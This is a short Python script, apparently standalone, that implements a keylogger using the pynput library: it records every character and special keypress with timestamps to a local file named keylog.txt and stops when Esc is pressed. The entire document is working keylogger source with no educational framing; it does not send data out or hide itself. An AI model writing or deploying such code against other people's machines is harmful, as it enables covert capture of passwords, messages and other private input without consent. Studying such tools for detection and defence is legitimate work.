from pynput.keyboard import Listener, Key
import logging

# Configure logging to save keystrokes in a file
log_file = "keylog.txt"

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to log the keypresses
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")  # Logs the character keys
    except AttributeError:
        logging.info(f"Special key pressed: {key}")  # Logs special keys like Shift, Enter, etc.

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:  # Stops logging when 'Esc' is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
